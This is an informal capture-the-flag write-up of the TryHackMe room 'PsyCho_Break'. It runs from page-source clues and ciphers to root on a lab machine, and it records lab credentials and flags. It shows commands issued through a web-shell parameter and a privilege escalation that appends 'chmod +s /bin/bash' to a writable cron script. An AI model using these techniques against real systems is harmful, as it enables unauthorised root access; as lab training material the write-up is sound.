### PsyCho_Break ###

export IP=10.10.18.246

Found this in the page source:
<!-- Sebastian sees a path through the darkness which leads to a room => /sadistRoom -->

The page included a key:
532219a04ab7a02b56faafbec1a4c1ea

# For the map:
Decode this piece of text "Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv" and get the key to access the map

Tried a python script to decrypt using ceaser cipher but no luck there...trying something else

# Atbash mirror cipher:(A becomes Z, B becomes X and so on)
Grant_me_access_to_the_map_please


The map showed 4 urls:2 of which i had visited:

# Safe Heaven:
had a comment:<!-- I think I'm having a terrible nightmare. Search through me and find it ... -->

Keeper was the directory...

Reverse search engine:staris.jpg:

st.augustine lighthouse

key: 48ee41458eb0b43bf82b986cecf3af01

# Abandonend Page:
<!-- There is something called "shell" on current page maybe that'll help you to get out of here !!!-->



<!-- To find more about the Spider Lady visit https://theevilwithin.fandom.com/wiki/Laura_(Creature) -->

### So called "Shell"
http://10.10.110.52/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php?shell=ls

assets dead.php herecomeslara.php index.php script.js 

contents of current dir

ls ..: showed one more dir:680e89809965ec41e64dc7e447f175ab

txt file: you_made_it.txt
# Contents: You made it. Escaping from Laura is not easy, good job .... 

also got helpme.zip:

root@kali:~/writeUps/tryhackme/psycho_break# unzip helpme.zip 
Archive:  helpme.zip
  inflating: helpme.txt              
  inflating: Table.jpg 

Turns out Table.jpg was actually a zip file:

# File:

ran file Table.jpg
got 2 more files from that file:

key.wav sounds like mourse code:showme

used audacity for that:

using steghide on the image...turns out it was SHOWME

Found thankyou.txt...
### FTP Details:
USER : joseph				||
	||	PASSWORD : intotheterror445

	got 2 files:program and random.dic

program if ofc a shell script which takes a word and prints something if its correct:

wrote a small python script:
kidman                                                                                                                       
kidman => Correct                                                                                                            
                                                                                                                             
Well Done !!!                                                                                                                
Decode This => 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33

looks like a OLD-Phones keypad decoded something if that makes any sense...idk whats the exact word for it:Trying manually to decode this:

kidmanspasswordissostrange

KIDMANSPASSWORDISSOSTRANGE
''' 
	kidman's password is sostrange
 '''
Sounds : kidman:sostrange...trying ssh

After trying several times: kidman:KIDMANSPASSWORDISSOSTRANGE - ssh

# User.txt:
4C72A4EF8E6FED69C72B4D58431C4254

Found two files in the home dir itself:

.readThis.txt:

uC@> z:5>2?i

%96 E9:?8 x 2> 23@FE E@ E6== D@ :D E@A D64C6E] }@ @?6 5@6D?VE <?@H 23@FE E9:D] xEVD E96 #FG:<VD 6J6] }@ @?6 42? 9:56 2H2J 7C@> :E] qFE x 42? E6== J@F @?6 E9:?8 D62C49 7@C E96 DEC:?8 YE9606J60@70CFG:<Y ] *@F 8@E E@ 96=A $632DE:2? 56762E #FG:< ]]]


.the_eye.txt:
I am watching you.



cat /etc/crontab...revelas a python script running every half a minute:
its writable too so its game over:
import os
os.system("chmod +s /bin/bash")


then after half a minute:/bin/bash -p:


# Root.txt:
BA33BDF5B8A3BFC431322F7D13F3361E

# Side Quest:

Also found a readme.txt:


 /\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
|  From Sebastian :                                                                     |
|                                                                                       |
|  You have one final task ... Help me to defeat ruvik !!!                              |
|                                                                                       |
 \/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/


 The hint revealed that i have to delete ruvik's acc..did'nt really tried it...to lazy to try it lol :)